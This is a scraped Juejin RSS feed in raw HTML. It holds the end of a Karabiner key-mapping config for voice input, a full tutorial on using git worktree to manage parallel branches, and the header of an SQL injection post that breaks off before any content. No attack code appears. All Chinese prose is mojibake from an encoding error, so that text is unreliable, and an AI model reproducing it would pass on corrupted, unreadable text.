                                        "key_code": <span class="hljs-string">"y"</span>,
                                        <span class="hljs-string">"modifiers"</span>: [<span class="hljs-string">"command"</span>]
                                    },
                                    {
                                        "set_variable": {
                                            "name": <span class="hljs-string">"voice_input_on"</span>,
                                            <span class="hljs-string">"value"</span>: <span class="hljs-number">1</span>
                                        }
                                    }
                                ],
                                "type": <span class="hljs-string">"basic"</span>
                            }
                        ]
                    },
                    {
                        "description": <span class="hljs-string">"ã€è±†åŒ…è¯­éŸ³ã€‘å³Command - å–æ¶ˆ"</span>,
                        <span class="hljs-string">"manipulators"</span>: [
                            {
                                "conditions": [
                                    {
                                        "name": <span class="hljs-string">"voice_input_on"</span>,
                                        <span class="hljs-string">"type"</span>: <span class="hljs-string">"variable_if"</span>,
                                        <span class="hljs-string">"value"</span>: <span class="hljs-number">1</span>
                                    }
                                ],
                                "<span class="hljs-selector-tag">from</span>": { "key_code": <span class="hljs-string">"right_command"</span> },
                                "<span class="hljs-selector-tag">to</span>": [{ "key_code": <span class="hljs-string">"right_command"</span> }],
                                "to_if_alone": [
                                    { "key_code": <span class="hljs-string">"escape"</span> },
                                    {
                                        "set_variable": {
                                            "name": <span class="hljs-string">"voice_input_on"</span>,
                                            <span class="hljs-string">"value"</span>: <span class="hljs-number">0</span>
                                        }
                                    }
                                ],
                                "type": <span class="hljs-string">"basic"</span>
                            }
                        ]
                    }
                ]
            },
            "name": <span class="hljs-string">"Default profile"</span>,
            <span class="hljs-string">"selected"</span>: true,
            <span class="hljs-string">"virtual_hid_keyboard"</span>: { "keyboard_type_v2": <span class="hljs-string">"iso"</span> }
        }
    ]
}
</code></pre>
<h3 data-id="heading-12">å…«ã€æ€»ç»“</h3>
<p>é€šè¿‡ä»¥ä¸Šé…ç½®ï¼Œå®ç° CapsLock ä¸€é”®æ§åˆ¶è±†åŒ…è¯­éŸ³è¾“å…¥å¯åœï¼Œæ“ä½œé›¶å»¶è¿Ÿã€æ— å†²çªï¼Œä¸€æ¬¡é…ç½®æ°¸ä¹…ç”Ÿæ•ˆï¼Œé€‚é…æ‰€æœ‰ macOS åœºæ™¯ä¸‹çš„è±†åŒ…ä½¿ç”¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Git å®æˆ˜ï¼šæˆ‘ç”¨ git worktree ä¸€æ¬¡æ€§æ‹‰å–å¤šä¸ªå·¥ä½œç›®å½•]]></title>    <link>https://juejin.cn/post/7595178023256735763</link>    <guid>https://juejin.cn/post/7595178023256735763</guid>    <pubDate>2026-01-15T10:30:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595178023256735763" data-draft-id="7595401278465949737" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Git å®æˆ˜ï¼šæˆ‘ç”¨ git worktree ä¸€æ¬¡æ€§æ‹‰å–å¤šä¸ªå·¥ä½œç›®å½•"/> <meta itemprop="keywords" content="Git"/> <meta itemprop="datePublished" content="2026-01-15T10:30:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Ryan_Deng"/> <meta itemprop="url" content="https://juejin.cn/user/1592553166353373"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Git å®æˆ˜ï¼šæˆ‘ç”¨ git worktree ä¸€æ¬¡æ€§æ‹‰å–å¤šä¸ªå·¥ä½œç›®å½•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1592553166353373/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Ryan_Deng
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T10:30:41.000Z" title="Thu Jan 15 2026 10:30:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿™ç¯‡æ–‡ç« ä¸»è¦è®²è§£ git worktree åœ¨æˆ‘æ—¥å¸¸å¼€å‘å·¥ä½œæµä¸­çš„ä½¿ç”¨ã€‚</p>
<h3 data-id="heading-0">èƒŒæ™¯è¯´æ˜</h3>
<p>å…ˆæ¥çœ‹ä¸‹æˆ‘çš„å·¥ä½œåœºæ™¯ã€‚</p>
<p>é¦–å…ˆï¼Œè¦å¼€å‘ä¸€ä¸ªæ–°åŠŸèƒ½ï¼Œæ­¤æ—¶æ‹‰å–ä¸€ä¸ªåŠŸèƒ½åˆ†æ”¯ï¼Œå¦‚ï¼šâ€œfeat/xxxâ€ã€‚
ç„¶åæµ‹è¯•è¯´ç”Ÿäº§ç¯å¢ƒå‘ç°ä¸€ä¸ªbugï¼Œéœ€è¦ç´§æ€¥ä¿®å¤ï¼Œæ­¤æ—¶æ‹‰å–ä¸€ä¸ªbugä¿®å¤åˆ†æ”¯ï¼Œå¦‚ï¼š"fix/yyy"ã€‚
æ¥ç€ï¼Œäº§å“ç»ç†è¯´ä¸€ä¸ªç´§æ€¥éœ€æ±‚è¦åšï¼Œæ²¡åŠæ³•ï¼Œå†åˆ›å»ºä¸€ä¸ªåˆ†æ”¯ ï¼Œå¦‚ï¼šâ€œfeat/zzzâ€ã€‚</p>
<p>å¯¹äºè¿™æ ·ä¸€ä¸ªåœºæ™¯ï¼Œéœ€è¦åœ¨å¤šä¸ªåˆ†æ”¯é‡Œå·¥ä½œã€‚æˆ‘å¯ä¸æƒ³æ¯æ¬¡ä»£ç å†™ä¸€åŠï¼Œç„¶åè´®è—èµ·æ¥ï¼Œè¿™æ ·å¤ªéº»çƒ¦äº†ã€‚</p>
<p>è¿™æ ·ï¼Œ<code>git worktree</code> å°±æ´¾ä¸Šç”¨åœºäº†ã€‚</p>
<p>å®˜æ–¹å¯¹è¿™ä¸ªå‘½ä»¤çš„æè¿°æ˜¯ï¼š<strong>ä¸€ä¸ª git ä»“åº“å¯ä»¥æ”¯æŒå¤šä¸ªå·¥ä½œåŒºï¼Œå…è®¸ä½ ä¸€æ¬¡ç­¾å‡ºå¤šä¸ªåˆ†æ”¯</strong>ã€‚</p>
<h3 data-id="heading-1">ä½¿ç”¨</h3>
<h4 data-id="heading-2">åŸºç¡€å‘½ä»¤</h4>
<p><strong>æ·»åŠ æ–°çš„å·¥ä½œåŒº</strong></p>
<pre><code class="hljs language-bash" lang="bash">git worktree add &lt;è·¯å¾„&gt; &lt;åˆ†æ”¯å&gt;
</code></pre>
<p>ä¾‹å¦‚ï¼Œä¸ºä¿®å¤ bug åˆ›å»ºä¸€ä¸ªæ–°çš„å·¥ä½œåŒºï¼š</p>
<pre><code class="hljs language-bash" lang="bash">git worktree add ../fix-yyy fix/yyy
</code></pre>
<p>è¿™ä¼šåœ¨å½“å‰ç›®å½•çš„å¤–å±‚åˆ›å»ºä¸€ä¸ªåä¸º <code>fix-yyy</code> çš„ç›®å½•ï¼Œè¿™ä¸ªç›®çš„ä¼šå¤„äº <code>fix/yyy</code> åˆ†æ”¯ã€‚</p>
<p><strong>åŸºäºè¿œç¨‹åˆ†æ”¯åˆ›å»ºå·¥ä½œåŒº</strong></p>
<p>å¦‚æœåˆ†æ”¯åœ¨è¿œç¨‹ä»“åº“ä½†æœ¬åœ°æ²¡æœ‰ï¼Œå¯ä»¥ç›´æ¥åŸºäºè¿œç¨‹åˆ†æ”¯åˆ›å»ºï¼š</p>
<pre><code class="hljs language-bash" lang="bash">git worktree add ../fix-yyy origin/fix/yyy
</code></pre>
<p><strong>åˆ›å»ºæ–°åˆ†æ”¯çš„å·¥ä½œåŒº</strong></p>
<p>å¦‚æœåˆ†æ”¯è¿˜ä¸å­˜åœ¨ï¼Œä½¿ç”¨ <code>-b</code> å‚æ•°åˆ›å»ºæ–°åˆ†æ”¯ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">git worktree add -b feat/zzz ../feat-zzz
</code></pre>
<p><strong>æŸ¥çœ‹æ‰€æœ‰å·¥ä½œåŒº</strong></p>
<pre><code class="hljs language-bash" lang="bash">git worktree list
</code></pre>
<p>è¾“å‡ºç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">D</span>:<span class="hljs-regexp">/project/m</span>ain           abc1234 [main]
<span class="hljs-attr">D</span>:<span class="hljs-regexp">/project/</span>fix-yyy        def5678 [fix/yyy]
<span class="hljs-attr">D</span>:<span class="hljs-regexp">/project/</span>feat-zzz       ghi9012 [feat/zzz]
</code></pre>
<p><strong>åˆ é™¤å·¥ä½œåŒº</strong></p>
<p>å·¥ä½œåŒºå¯ä»¥ä½¿ç”¨ä¸‹é¢å‘½ä»¤åˆ é™¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">git worktree remove &lt;å·¥ä½œåŒºè·¯å¾„&gt;
</code></pre>
<p><strong>æ¸…ç†å·¥ä½œåŒºè®°å½•</strong></p>
<p>æœ‰æ—¶å·¥ä½œåŒºç›®å½•è¢«æ‰‹åŠ¨åˆ é™¤ï¼Œä½† Git è¿˜è®°å½•ç€ï¼Œå¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤æ¸…ç†ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">git worktree prune
</code></pre>
<h4 data-id="heading-3">å®æˆ˜æ¡ˆä¾‹</h4>
<p>è®©æˆ‘ç”¨ä¸€ä¸ªå®Œæ•´çš„æ¡ˆä¾‹æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ <code>git worktree</code> ç®¡ç†å¤šä¸ªå·¥ä½œåˆ†æ”¯ã€‚</p>
<p><strong>åœºæ™¯ï¼š</strong></p>
<ul>
<li>ä¸»é¡¹ç›®åœ¨ <code>D:\projects\myapp</code> ç›®å½•</li>
<li>æ­£åœ¨ <code>main</code> åˆ†æ”¯å¼€å‘æ–°åŠŸèƒ½</li>
<li>çªç„¶éœ€è¦ä¿®å¤ç”Ÿäº§ç¯å¢ƒ bug</li>
<li>åŒæ—¶äº§å“ç»ç†è¦æ±‚ç´§æ€¥å¼€å‘ä¸€ä¸ªæ–°åŠŸèƒ½</li>
</ul>
<p><strong>æ­¥éª¤ 1ï¼šæŸ¥çœ‹å½“å‰çŠ¶æ€</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> D:\projects\myapp
git worktree list
</code></pre>
<p>è¾“å‡ºï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">D</span>:<span class="hljs-regexp">/projects/my</span>app  a1b2c3d [main]
</code></pre>
<p><strong>æ­¥éª¤ 2ï¼šä¸º bug ä¿®å¤åˆ›å»ºå·¥ä½œåŒº</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ‹‰å–è¿œç¨‹æœ€æ–°ä»£ç </span>
git fetch origin

<span class="hljs-comment"># åŸºäºè¿œç¨‹çš„ hotfix åˆ†æ”¯åˆ›å»ºå·¥ä½œåŒº</span>
git worktree add ../myapp-hotfix origin/hotfix/fix-login-issue

<span class="hljs-comment"># æˆ–è€…åˆ›å»ºæ–°çš„ hotfix åˆ†æ”¯</span>
git worktree add -b hotfix/fix-payment ../myapp-hotfix
</code></pre>
<p><strong>æ­¥éª¤ 3ï¼šä¸ºç´§æ€¥éœ€æ±‚åˆ›å»ºå·¥ä½œåŒº</strong></p>
<pre><code class="hljs language-bash" lang="bash">git worktree add -b feat/urgent-feature ../myapp-urgent
</code></pre>
<p><strong>æ­¥éª¤ 4ï¼šæŸ¥çœ‹æ‰€æœ‰å·¥ä½œåŒº</strong></p>
<pre><code class="hljs language-bash" lang="bash">git worktree list
</code></pre>
<p>è¾“å‡ºï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">D</span>:<span class="hljs-regexp">/projects/my</span>app          a1b2c3d [main]
<span class="hljs-attr">D</span>:<span class="hljs-regexp">/projects/my</span>app-hotfix   e4f5g6h [hotfix/fix-payment]
<span class="hljs-attr">D</span>:<span class="hljs-regexp">/projects/my</span>app-urgent   i7j8k9l [feat/urgent-feature]
</code></pre>
<p><strong>æ­¥éª¤ 5ï¼šåœ¨ä¸åŒå·¥ä½œåŒºä¹‹é—´åˆ‡æ¢</strong></p>
<p>ç°åœ¨ä½ å¯ä»¥åœ¨ä¸åŒçš„ç›®å½•ä¸­å·¥ä½œï¼Œæ— éœ€åˆ‡æ¢åˆ†æ”¯ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¿®å¤ bug</span>
<span class="hljs-built_in">cd</span> D:\projects\myapp-hotfix
<span class="hljs-comment"># ... ç¼–å†™ä»£ç ï¼Œæäº¤</span>
git add .
git commit -m <span class="hljs-string">"fix: ä¿®å¤æ”¯ä»˜é—®é¢˜"</span>
git push origin hotfix/fix-payment

<span class="hljs-comment"># å¼€å‘ç´§æ€¥åŠŸèƒ½</span>
<span class="hljs-built_in">cd</span> D:\projects\myapp-urgent
<span class="hljs-comment"># ... ç¼–å†™ä»£ç ï¼Œæäº¤</span>
git add .
git commit -m <span class="hljs-string">"feat: æ·»åŠ ç´§æ€¥åŠŸèƒ½"</span>
git push origin feat/urgent-feature

<span class="hljs-comment"># å›åˆ°ä¸»å¼€å‘</span>
<span class="hljs-built_in">cd</span> D:\projects\myapp
<span class="hljs-comment"># ç»§ç»­åŸæ¥çš„å·¥ä½œ</span>
</code></pre>
<p><strong>æ­¥éª¤ 6ï¼šå®Œæˆåæ¸…ç†å·¥ä½œåŒº</strong></p>
<p>å½“åˆ†æ”¯åˆå¹¶å®Œæˆåï¼Œåˆ é™¤ä¸å†éœ€è¦çš„å·¥ä½œåŒºï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ é™¤ hotfix å·¥ä½œåŒº</span>
git worktree remove ../myapp-hotfix

<span class="hljs-comment"># åˆ é™¤ç´§æ€¥åŠŸèƒ½å·¥ä½œåŒº</span>
git worktree remove ../myapp-urgent

<span class="hljs-comment"># æ¸…ç†å·²åˆ é™¤å·¥ä½œåŒºçš„è®°å½•</span>
git worktree prune
</code></pre>
<h3 data-id="heading-4">æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-5">1. ç»Ÿä¸€çš„ç›®å½•ç»“æ„</h4>
<p>å»ºè®®å°†æ‰€æœ‰å·¥ä½œåŒºæ”¾åœ¨åŒä¸€çˆ¶ç›®å½•ä¸‹ï¼Œä¾¿äºç®¡ç†ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">projects/
â”œâ”€â”€ myapp/          <span class="hljs-comment"># ä¸»å·¥ä½œåŒºï¼ˆmain åˆ†æ”¯ï¼‰</span>
â”œâ”€â”€ myapp-dev/      <span class="hljs-comment"># å¼€å‘åˆ†æ”¯</span>
â”œâ”€â”€ myapp-feat1/    <span class="hljs-comment"># åŠŸèƒ½åˆ†æ”¯ 1</span>
â”œâ”€â”€ myapp-feat2/    <span class="hljs-comment"># åŠŸèƒ½åˆ†æ”¯ 2</span>
â””â”€â”€ myapp-hotfix/   <span class="hljs-comment"># çƒ­ä¿®å¤åˆ†æ”¯</span>
</code></pre>
<h4 data-id="heading-6">2. å‘½åè§„èŒƒ</h4>
<p>å·¥ä½œåŒºç›®å½•å‘½åå»ºè®®åŒ…å«é¡¹ç›®åå’Œåˆ†æ”¯ç±»å‹ï¼š</p>
<ul>
<li><code>&lt;é¡¹ç›®&gt;-&lt;åˆ†æ”¯ç±»å‹&gt;</code> ä¾‹å¦‚ï¼š<code>myapp-dev</code>, <code>myapp-hotfix</code></li>
<li><code>&lt;é¡¹ç›®&gt;-&lt;åŠŸèƒ½æè¿°&gt;</code> ä¾‹å¦‚ï¼š<code>myapp-payment</code>, <code>myapp-auth</code></li>
</ul>
<h4 data-id="heading-7">3. å®šæœŸæ¸…ç†</h4>
<p>å®šæœŸæ£€æŸ¥å¹¶æ¸…ç†ä¸å†ä½¿ç”¨çš„å·¥ä½œåŒºï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰å·¥ä½œåŒº</span>
git worktree list

<span class="hljs-comment"># åˆ é™¤ä¸éœ€è¦çš„å·¥ä½œåŒº</span>
git worktree remove &lt;è·¯å¾„&gt;

<span class="hljs-comment"># æ¸…ç†è®°å½•</span>
git worktree prune
</code></pre>
<h3 data-id="heading-8">æ€»ç»“</h3>
<p><code>git worktree</code> æ˜¯ä¸€ä¸ªéå¸¸å®ç”¨çš„åŠŸèƒ½ï¼Œç‰¹åˆ«é€‚åˆéœ€è¦é¢‘ç¹åœ¨å¤šä¸ªåˆ†æ”¯ä¹‹é—´åˆ‡æ¢çš„åœºæ™¯ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2-03SQLæ³¨å…¥æ¼æ´------------2]]></title>    <link>https://juejin.cn/post/7595410455222583306</link>    <guid>https://juejin.cn/post/7595410455222583306</guid>    <pubDate>2026-01-15T10:22:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595410455222583306" data-draft-id="7594835618120368168" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2-03SQLæ³¨å…¥æ¼æ´------------2 "/> <meta itemprop="keywords" content="é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-15T10:22:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Ey443"/> <meta itemprop="url" content="https://juejin.cn/user/3335244639642203"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2-03SQLæ³¨å…¥æ¼æ´------------2 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3335244639642203/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Ey443
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T10:22:20.000Z" title="Thu Jan 15 2026 10:22:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 